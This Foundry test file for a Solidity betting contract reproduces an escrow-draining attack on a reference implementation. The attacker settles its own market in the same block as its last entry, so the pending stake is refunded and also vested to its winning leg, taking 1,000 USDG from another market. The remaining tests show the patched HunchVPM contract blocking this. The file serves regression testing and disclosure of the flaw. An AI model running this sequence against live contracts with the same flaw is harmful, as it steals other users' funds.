// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {VestedParimutuel, IERC20 as RefIERC20} from "../src/reference/VestedParimutuel.sol";
import {HunchVPM, IERC20} from "../src/HunchVPM.sol";
import {MockUSDG} from "../src/mocks/MockUSDG.sol";

/// @title D8 · Settling in the last entry's block, as Robinhood Chain allows
/// @notice On Robinhood Chain `block.number` is the L1 block estimate (~12 s) while
///         `block.timestamp` is the L2 time, so an entry at T - 1 s and the settlement at
///         T + 1 s can share a `block.number`. The reference only finalizes a vintage once
///         `block.number` has advanced, so it settles with that entry still pending; a claim
///         then refunds the whole pending stake, and a later `finalizeVintage` vests the same
///         stake into the winners again. The settler holds every market's escrow, so the
///         excess comes out of other markets. These tests reproduce that drain on the
///         reference (with `vm.warp` but no `vm.roll`, exactly the chain's semantics) and show
///         HunchVPM (D8) settling the same sequence correctly.
contract SameBlockSettlementTest is Test {
    VestedParimutuel internal ref;
    HunchVPM internal vpm;
    MockUSDG internal usdg;

    address internal victim = makeAddr("victim market's bettors");
    address internal attacker = makeAddr("attacker");
    uint64 internal T;

    function setUp() public {
        vm.warp(1_790_000_000);
        vm.roll(23_000_000);
        ref = new VestedParimutuel();
        vpm = new HunchVPM(makeAddr("guardian"), makeAddr("treasury"), address(this), address(0)); // D10: this test is the factory
        usdg = new MockUSDG();
        T = uint64(block.timestamp + 1 hours);
        usdg.mint(victim, 10_000e6);
        usdg.mint(attacker, 2_040e6);
        vm.startPrank(victim);
        usdg.approve(address(ref), type(uint256).max);
        usdg.approve(address(vpm), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker);
        usdg.approve(address(ref), type(uint256).max);
        usdg.approve(address(vpm), type(uint256).max);
        vm.stopPrank();
    }

    function _seed(uint256 a, uint256 b) internal pure returns (uint256[] memory s) {
        s = new uint256[](2);
        s[0] = a;
        s[1] = b;
    }

    /// @dev D10: only the factory creates HunchVPM markets. This test stands in for it: `who`
    ///      pays the seed and receives both seed legs, exactly as HunchMarketFactory hands them
    ///      to its opener, so the D8 sequences below are the reference's, market for market.
    function _createAs(address who, uint256[] memory seed, uint256 kappa, uint64 t, address res)
        internal
        returns (uint256 m)
    {
        vm.prank(who);
        usdg.transfer(address(this), seed[0] + seed[1]);
        usdg.approve(address(vpm), seed[0] + seed[1]);
        uint256 first = vpm.positionCount();
        m = vpm.create(IERC20(address(usdg)), seed, kappa, t, 1 days, res, res, 0, 0, 0);
        vpm.transferPosition(first, who);
        vpm.transferPosition(first + 1, who);
    }

    /// @notice The drain, on the reference: the attacker opens its own market (resolver = itself,
    ///         κ unbounded), enters 1,000 on DOWN one second before its bell, resolves UP one
    ///         second after it in the same L1 block, claims the pending DOWN stake back as a
    ///         "refund", then finalizes the vintage, which vests the same 1,000 into its UP seed
    ///         leg. It walks away with 1,000 USDG of the victim market's escrow.
    function test_TheReferenceIsDrainedWhenSettledInTheLastEntrysBlock() public {
        vm.prank(victim);
        ref.create(RefIERC20(address(usdg)), _seed(2_500e6, 2_500e6), 30, T + 7 days, 1 days, victim, victim);

        vm.startPrank(attacker);
        uint256 m =
            ref.create(RefIERC20(address(usdg)), _seed(10e6, 10e6), type(uint256).max, T, 1 days, attacker, attacker);
        uint256 up = ref.positionCount() - 2;
        vm.roll(block.number + 1);
        vm.warp(T - 1);
        uint256 e = ref.enter(m, 1, 1_000e6);
        vm.warp(T + 1); // same block.number: same L1 block
        ref.resolve(m, 0);
        ref.claim(e); // still pending: the full 1,000 comes back as a refund
        vm.roll(block.number + 1);
        ref.finalizeVintage(m); // and now the same 1,000 vests into UP
        ref.claim(up);
        ref.claim(up + 1);
        vm.stopPrank();

        assertEq(usdg.balanceOf(attacker), 2_040e6 + 1_000e6, "the attacker gained 1,000 USDG");
        assertEq(usdg.balanceOf(address(ref)), 5_000e6 - 1_000e6, "taken from the victim market's escrow");
    }

    /// @notice The same sequence on HunchVPM: `resolve` finalizes the pending vintage in the
    ///         same block (D8), so the DOWN stake is accepted and lost, the UP seed leg is paid
    ///         once, and the victim market's escrow is untouched.
    function test_HunchVPMSettlesTheSameSequenceCorrectly() public {
        _createAs(victim, _seed(2_500e6, 2_500e6), 30, T + 7 days, victim);

        uint256 m = _createAs(attacker, _seed(10e6, 10e6), type(uint256).max, T, attacker);
        uint256 up = vpm.positionCount() - 2;
        vm.startPrank(attacker);
        vm.roll(block.number + 1);
        vm.warp(T - 1);
        uint256 e = vpm.enter(m, 1, 1_000e6);
        vm.warp(T + 1);
        vpm.resolve(m, 0);
        (,,, bool finalized,,,,, uint128 accepted,) = vpm.positions(e);
        assertTrue(finalized, "D8: the last vintage is final at settlement");
        assertEq(accepted, 1_000e6);
        assertEq(vpm.pendingCount(m), 0);
        vpm.claim(e); // DOWN lost: nothing, and no refund (it was accepted in full)
        vm.roll(block.number + 1);
        vpm.finalizeVintage(m); // nothing left to finalize
        vpm.claim(up);
        vpm.claim(up + 1);
        vpm.claimResidue(m);
        vm.stopPrank();

        assertEq(usdg.balanceOf(attacker), 2_040e6, "no gain: its own 1,000 went to its own UP leg");
        assertEq(usdg.balanceOf(address(vpm)), 5_000e6, "the victim market's escrow is intact");
    }

    /// @notice A void in the same block finalizes too, and refunds every entry exactly once.
    function test_AVoidInTheLastEntrysBlockRefundsExactlyOnce() public {
        _createAs(victim, _seed(2_500e6, 2_500e6), 30, T + 7 days, victim);
        uint256 m = _createAs(attacker, _seed(10e6, 10e6), 2, T, attacker);
        vm.startPrank(attacker);
        vm.roll(block.number + 1);
        vm.warp(T - 1);
        uint256 e = vpm.enter(m, 1, 1_000e6); // κ = 2: accepted 10, 990 refused
        vm.warp(T);
        vpm.voidMarket(m);
        (,,, bool finalized,,,,, uint128 accepted,) = vpm.positions(e);
        assertTrue(finalized);
        assertEq(accepted, 10e6);
        vpm.claim(e);
        vm.roll(block.number + 1);
        vpm.finalizeVintage(m);
        vpm.claim(e - 2);
        vpm.claim(e - 1);
        vm.stopPrank();
        assertEq(usdg.balanceOf(attacker), 2_040e6, "everything back, once");
        assertEq(usdg.balanceOf(address(vpm)), 5_000e6);
    }

    /// @notice When the block HAS advanced (the only case the reference was written for), D8
    ///         changes nothing: both settlers finalize the same vintage at settlement.
    function test_InALaterBlockBothSettlersAgree() public {
        uint256 b = _createAs(attacker, _seed(10e6, 10e6), 30, T, attacker);
        vm.startPrank(attacker);
        uint256 a = ref.create(RefIERC20(address(usdg)), _seed(10e6, 10e6), 30, T, 1 days, attacker, attacker);
        vm.roll(block.number + 1);
        vm.warp(T - 1);
        uint256 ea = ref.enter(a, 1, 100e6);
        uint256 eb = vpm.enter(b, 1, 100e6);
        vm.roll(block.number + 1);
        vm.warp(T + 1);
        ref.resolve(a, 0);
        vpm.resolve(b, 0);
        vm.stopPrank();
        (,,, bool fa,,,,, uint128 aa, uint128 xa) = ref.positions(ea);
        (,,, bool fb,,,,, uint128 ab, uint128 xb) = vpm.positions(eb);
        assertEq(abi.encode(fa, aa, xa), abi.encode(fb, ab, xb));
        assertEq(abi.encode(ref.getBook(a, 0)), abi.encode(vpm.getBook(b, 0)));
        assertEq(abi.encode(ref.getBook(a, 1)), abi.encode(vpm.getBook(b, 1)));
    }

    /// @notice D10: on HunchVPM the attacker cannot even open the market the drain needs (its
    ///         own resolver, κ unbounded). Only the factory creates markets, and the factory
    ///         lists only binary κ = 30 USDG markets resolved by StockRoundResolver.
    function test_D10_TheAttackerCannotOpenItsOwnMarket() public {
        vm.prank(attacker);
        vm.expectRevert(HunchVPM.NotFactory.selector);
        vpm.create(IERC20(address(usdg)), _seed(10e6, 10e6), type(uint256).max, T, 1 days, attacker, attacker, 0, 0, 0);
    }
}
